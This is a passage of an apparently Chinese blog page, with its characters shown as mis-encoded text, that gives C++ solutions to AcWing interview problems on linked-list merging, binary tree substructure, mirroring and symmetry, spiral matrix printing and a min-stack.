href="https://www.acwing.com/problem/content/34/">åˆå¹¶ä¸¤ä¸ªæ’åºçš„é“¾è¡¨</a></h2><p>è¾“å…¥ä¸¤ä¸ªé€’å¢æ’åºçš„é“¾è¡¨ï¼Œåˆå¹¶è¿™ä¸¤ä¸ªé“¾è¡¨å¹¶ä½¿æ–°é“¾è¡¨ä¸­çš„ç»“ç‚¹ä»ç„¶æ˜¯æŒ‰ç…§é€’å¢æ’åºçš„ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>é“¾è¡¨é•¿åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>500</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,500]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">500</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼š1-&gt;3-&gt;5 , 2-&gt;4-&gt;5è¾“å‡ºï¼š1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;5</code></pre><h3 id="é¢˜è§£-3">é¢˜è§£</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">ListNode* <span class="title">merge</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>&#123;</span><br><span class="line">    ListNode *dummy = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">-1</span>), *cur = dummy;</span><br><span class="line">    <span class="keyword">while</span> (l1 &amp;&amp; l2) &#123;</span><br><span class="line">      <span class="keyword">if</span> (l1-&gt;val &lt;= l2-&gt;val) &#123;</span><br><span class="line">        cur-&gt;next = l1;</span><br><span class="line">        l1 = l1-&gt;next;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cur-&gt;next = l2;</span><br><span class="line">        l2 = l2-&gt;next;</span><br><span class="line">      &#125;</span><br><span class="line">      cur = cur-&gt;next;  <span class="comment">// curä¹Ÿè¦ç§»åŠ¨</span></span><br><span class="line">    &#125;</span><br><span class="line">    cur-&gt;next = (l1? l1: l2);</span><br><span class="line">    <span class="keyword">return</span> dummy-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="æ ‘çš„å­ç»“æ„"><a href="https://www.acwing.com/problem/content/35/">æ ‘çš„å­ç»“æ„</a></h2><p>è¾“å…¥ä¸¤æ£µäºŒå‰æ ‘ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mtext>ï¼Œ</mtext><mi>B</mi></mrow><annotation encoding="application/x-tex">Aï¼ŒB</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>ï¼Œåˆ¤æ–­ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> æ˜¯ä¸æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> çš„å­ç»“æ„ã€‚</p><p>æˆ‘ä»¬è§„å®šç©ºæ ‘ä¸æ˜¯ä»»ä½•æ ‘çš„å­ç»“æ„ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>æ¯æ£µæ ‘çš„èŠ‚ç‚¹æ•°é‡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><p>æ ‘ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span>ï¼š</p><pre><code>     8    / \   8   7  / \ 9   2    / \   4   7</code></pre><p>æ ‘ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>ï¼š</p><pre><code>   8  / \ 9   2</code></pre><p>è¿”å› <strong>true</strong>ï¼Œå› ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span> æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span></span></span></span> çš„å­ç»“æ„ã€‚</p><h3 id="é€’å½’æ³•">é€’å½’æ³•</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">hasSubtree</span><span class="params">(TreeNode* pRoot1, TreeNode* pRoot2)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// pRoot2ä¸ºç©ºä¸æ˜¯ä»»ä½•æ ‘çš„å­ç»“æ„, pRoot1ä¸ºç©ºä¸ºç»ˆæ­¢æ¡ä»¶</span></span><br><span class="line">    <span class="keyword">if</span> (!pRoot1 || !pRoot2) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">dfs</span>(pRoot1, pRoot2)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hasSubtree</span>(pRoot1-&gt;left, pRoot2) || <span class="built_in">hasSubtree</span>(pRoot1-&gt;right, pRoot2);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">dfs</span><span class="params">(TreeNode *pRoot1, TreeNode *pRoot2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!pRoot2) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (!pRoot1 || pRoot1-&gt;val != pRoot2-&gt;val) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">dfs</span>(pRoot1-&gt;left, pRoot2-&gt;left) &amp;&amp; <span class="built_in">dfs</span>(pRoot1-&gt;right, pRoot2-&gt;right);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ <code>dfs</code> ä¸èƒ½å†™ä¸‹é¢è¿™ä¸ªå‡½æ•°ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">IsSame</span><span class="params">(TreeNode *A, TreeNode *B)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!A || !B) <span class="keyword">return</span> !A &amp;&amp; !B;</span><br><span class="line">  <span class="keyword">return</span> A-&gt;val == B-&gt;val &amp;&amp; <span class="built_in">IsSame</span>(A-&gt;left, B-&gt;left) &amp;&amp; <span class="built_in">IsSame</span>(A-&gt;right, B-&gt;right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºä»æœ¬é¢˜ç»™å‡ºçš„ä¾‹å­çœ‹å‡º <strong>â€œå­ç»“æ„â€</strong> å¹¶éè¦æ±‚å®Œå…¨ä¸€è‡´ï¼ˆAæ ‘ä¸­çš„2è¿˜æœ‰ä¸¤ä¸ªå„¿å­ï¼Œè€ŒBæ ‘ä¸­2ä¸ºå¶å­èŠ‚ç‚¹ï¼‰ã€‚</p></blockquote><h2 id="äºŒå‰æ ‘çš„é•œåƒ"><a href="https://www.acwing.com/problem/content/37/">äºŒå‰æ ‘çš„é•œåƒ</a></h2><p>è¾“å…¥ä¸€ä¸ªäºŒå‰æ ‘ï¼Œå°†å®ƒå˜æ¢ä¸ºå®ƒçš„é•œåƒã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>æ ‘ä¸­èŠ‚ç‚¹æ•°é‡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>100</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,100]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">100</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥æ ‘ï¼š      8     / \    6  10   / \ / \  5  7 9 11 [8,6,10,5,7,9,11,null,null,null,null,null,null,null,null] è¾“å‡ºæ ‘ï¼š      8     / \    10  6   / \ / \  11 9 7  5 [8,10,6,11,9,7,5,null,null,null,null,null,null,null,null]</code></pre><h3 id="é€’å½’æ³•-2">é€’å½’æ³•</h3><p>é€’å½’éå†åŸæ ‘çš„æ‰€æœ‰èŠ‚ç‚¹ï¼Œå°†æ¯ä¸ªèŠ‚ç‚¹çš„å·¦å³å„¿å­äº’æ¢å³å¯ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">mirror</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">mirror</span>(root-&gt;left);</span><br><span class="line">    <span class="built_in">mirror</span>(root-&gt;right);</span><br><span class="line">    <span class="built_in">swap</span>(root-&gt;left, root-&gt;right);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="å¯¹ç§°çš„äºŒå‰æ ‘"><a href="https://www.acwing.com/problem/content/38/">å¯¹ç§°çš„äºŒå‰æ ‘</a></h2><p>è¯·å®ç°ä¸€ä¸ªå‡½æ•°ï¼Œç”¨æ¥åˆ¤æ–­ä¸€æ£µäºŒå‰æ ‘æ˜¯ä¸æ˜¯å¯¹ç§°çš„ã€‚</p><p>å¦‚æœä¸€æ£µäºŒå‰æ ‘å’Œå®ƒçš„é•œåƒä¸€æ ·ï¼Œé‚£ä¹ˆå®ƒæ˜¯å¯¹ç§°çš„ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>æ ‘ä¸­èŠ‚ç‚¹æ•°é‡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>100</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,100]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">100</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>å¦‚ä¸‹å›¾æ‰€ç¤ºäºŒå‰æ ‘[1,2,2,3,4,4,3,null,null,null,null,null,null,null,null]ä¸ºå¯¹ç§°äºŒå‰æ ‘ï¼š    1   / \  2   2 / \ / \3  4 4  3å¦‚ä¸‹å›¾æ‰€ç¤ºäºŒå‰æ ‘[1,2,2,null,4,4,3,null,null,null,null,null,null]ä¸æ˜¯å¯¹ç§°äºŒå‰æ ‘ï¼š    1   / \  2   2   \ / \   4 4  3</code></pre><h3 id="é€’å½’æ³•-3">é€’å½’æ³•</h3><p>ä¸¤ä¸ªå­æ ‘äº’ä¸ºé•œåƒå½“ä¸”ä»…å½“ï¼š</p><ol><li>ä¸¤ä¸ªå­æ ‘çš„æ ¹èŠ‚ç‚¹å€¼ç›¸ç­‰ï¼›</li><li>ç¬¬ä¸€æ£µå­çš„å·¦å­æ ‘å’Œç¬¬äºŒæ£µå­æ ‘çš„å³å­æ ‘äº’ä¸ºé•œåƒï¼Œä¸”ç¬¬ä¸€æ£µå­æ ‘çš„å³å­æ ‘å’Œç¬¬äºŒæ£µå­æ ‘çš„å·¦å­æ ‘äº’ä¸ºé•œåƒï¼›</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">isSymmetric</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">dfs</span>(root-&gt;left, root-&gt;right);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">dfs</span><span class="params">(TreeNode *p, TreeNode *q)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!p || !q) <span class="keyword">return</span> !p &amp;&amp; !q;</span><br><span class="line">    <span class="keyword">return</span> p-&gt;val == q-&gt;val &amp;&amp; <span class="built_in">dfs</span>(p-&gt;left, q-&gt;right) &amp;&amp; <span class="built_in">dfs</span>(p-&gt;right, q-&gt;left);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="é¡ºæ—¶é’ˆæ‰“å°çŸ©é˜µâ˜…"><a href="https://www.acwing.com/problem/content/39/">é¡ºæ—¶é’ˆæ‰“å°çŸ©é˜µâ˜…</a></h2><p>è¾“å…¥ä¸€ä¸ªçŸ©é˜µï¼ŒæŒ‰ç…§ä»å¤–å‘é‡Œä»¥é¡ºæ—¶é’ˆçš„é¡ºåºä¾æ¬¡æ‰“å°å‡ºæ¯ä¸€ä¸ªæ•°å­—ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>çŸ©é˜µä¸­å…ƒç´ æ•°é‡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>400</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,400]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">400</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼š[  [1, 2, 3, 4],  [5, 6, 7, 8],  [9,10,11,12]]è¾“å‡ºï¼š[1,2,3,4,8,12,11,10,9,5,6,7]</code></pre><h3 id="æ¨¡æ‹Ÿæ³•">æ¨¡æ‹Ÿæ³•</h3><p>èµ°åˆ°å¤´ï¼Œæˆ–è€…èµ°åˆ°å·²ç»èµ°è¿‡çš„åœ°æ–¹å°±æ‰å¤´ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">printMatrix</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt; &gt; matrix)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">    <span class="keyword">if</span> (matrix.<span class="built_in">empty</span>()) <span class="keyword">return</span> res;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> n = matrix.<span class="built_in">size</span>(), m = matrix[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">    vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; <span class="built_in">st</span>(n, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(m, <span class="literal">false</span>));</span><br><span class="line">    <span class="type">int</span> x = <span class="number">0</span>, y = <span class="number">0</span>, d = <span class="number">1</span>, a, b;</span><br><span class="line">    <span class="type">int</span> dx[<span class="number">4</span>] = &#123;<span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>&#125;, dy[<span class="number">4</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n * m; i++) &#123;</span><br><span class="line">      res.<span class="built_in">push_back</span>(matrix[x][y]);</span><br><span class="line">      st[x][y] = <span class="literal">true</span>;</span><br><span class="line">      </span><br><span class="line">      a = x + dx[d], b = y + dy[d];</span><br><span class="line">      <span class="keyword">if</span> (a &gt;= n || a &lt; <span class="number">0</span> || b &gt;= m || b &lt; <span class="number">0</span> || st[a][b]) &#123;  <span class="comment">// st[a][b]å¿…é¡»æ”¾æœ€å, å¦åˆ™å¯èƒ½è®¿é—®å‡ºç•Œ</span></span><br><span class="line">        d = (d + <span class="number">1</span>) % <span class="number">4</span>;</span><br><span class="line">        a = x + dx[d], b = y + dy[d];</span><br><span class="line">      &#125;</span><br><span class="line">      x = a, y = b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="åŒ…å«minå‡½æ•°çš„æ ˆâ˜…"><a href="https://www.acwing.com/problem/content/90/">åŒ…å«minå‡½æ•°çš„æ ˆâ˜…</a></h2><p>è®¾è®¡ä¸€ä¸ªæ”¯æŒpushï¼Œpopï¼Œtopç­‰æ“ä½œå¹¶ä¸”å¯ä»¥åœ¨O(1)æ—¶é—´å†…æ£€ç´¢å‡ºæœ€å°å…ƒç´ çš„å †æ ˆã€‚</p><ul><li>push(x)â€“å°†å…ƒç´ xæ’å…¥æ ˆä¸­</li><li>pop()â€“ç§»é™¤æ ˆé¡¶å…ƒç´ </li><li>top()â€“å¾—åˆ°æ ˆé¡¶å…ƒç´ </li><li>getMin()â€“å¾—åˆ°æ ˆä¸­æœ€å°å…ƒç´ </li></ul><p><strong>æ•°æ®èŒƒå›´</strong></p><p>æ“ä½œå‘½ä»¤æ€»æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>100</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,100]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">100</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>MinStack minStack = new MinStack();minStack.push(-1);minStack.push(3);minStack.push(-4);minStack.getMin();   --&gt; Returns -4.minStack.pop();minStack.top();      --&gt; Returns 3.minStack.getMin();   --&gt; Returns -1.</code></pre><h3 id="è¾…åŠ©æ ˆ">è¾…åŠ©æ ˆ</h3><p>æˆ‘ä»¬é™¤äº†ç»´æŠ¤åŸºæœ¬çš„æ ˆç»“æ„ä¹‹å¤–ï¼Œè¿˜éœ€è¦ç»´æŠ¤ä¸€ä¸ªå•è°ƒæ ˆï¼Œæ¥å®ç°è¿”å›æœ€å°å€¼çš„æ“ä½œã€‚<br>ä¸‹é¢ä»‹ç»å¦‚ä½•ç»´æŠ¤å•è°ƒæ ˆï¼š</p><ul><li>å½“æˆ‘ä»¬å‘æ ˆä¸­å‹å…¥ä¸€ä¸ªæ•°æ—¶ï¼Œå¦‚æœè¯¥æ•° â‰¤â‰¤ å•è°ƒæ ˆçš„æ ˆé¡¶å…ƒç´ ï¼Œåˆ™å°†è¯¥æ•°åŒæ—¶å‹å…¥å•è°ƒæ ˆä¸­ï¼›å¦åˆ™ï¼Œä¸å‹å…¥ï¼Œè¿™æ˜¯ç”±äºæ ˆå…·æœ‰å…ˆè¿›åå‡ºæ€§è´¨ï¼Œæ‰€ä»¥åœ¨è¯¥æ•°è¢«å¼¹å‡ºä¹‹å‰ï¼Œæ ˆä¸­ä¸€ç›´å­˜åœ¨ä¸€ä¸ªæ•°æ¯”è¯¥æ•°å°ï¼Œæ‰€ä»¥è¯¥æ•°ä¸€å®šä¸ä¼šè¢«å½“åšæœ€å°æ•°è¾“å‡ºã€‚</li><li>å½“æˆ‘ä»¬ä»æ ˆä¸­å¼¹å‡ºä¸€ä¸ªæ•°æ—¶ï¼Œå¦‚æœè¯¥æ•°ç­‰äºå•è°ƒæ ˆçš„æ ˆé¡¶å…ƒç´ ï¼Œåˆ™åŒæ—¶å°†å•è°ƒæ ˆçš„æ ˆé¡¶å…ƒç´ å¼¹å‡ºã€‚</li><li>å•è°ƒæ ˆç”±äºå…¶å…·æœ‰å•è°ƒæ€§ï¼Œæ‰€ä»¥å®ƒçš„æ ˆé¡¶å…ƒç´ ï¼Œå°±æ˜¯å½“å‰æ ˆä¸­çš„æœ€å°æ•°ã€‚</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MinStack</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  stack&lt;<span class="type">int</span>&gt; stk, min_stk;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/** initialize your data structure here. */</span></span><br><span class="line">  <span class="built_in">MinStack</span>() &#123;</span><br><span class="line">      </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    stk.<span 